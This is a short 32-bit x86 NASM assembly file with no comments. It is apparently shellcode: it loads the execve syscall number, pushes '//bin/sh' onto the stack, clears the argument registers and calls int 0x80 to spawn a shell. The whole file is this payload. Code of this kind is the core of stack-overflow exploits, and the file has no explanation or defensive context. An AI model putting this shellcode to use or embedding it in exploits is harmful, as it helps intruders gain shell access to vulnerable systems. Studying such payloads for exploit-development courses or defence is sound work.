BITS 32

global _start

section .text

_start:
    push 0xb
    mov eax, [esp]
    xor edx, edx
    push edx
    push 'n/sh'
    push '//bi'
    mov ebx, esp
    xor ecx, ecx
    int 0x80
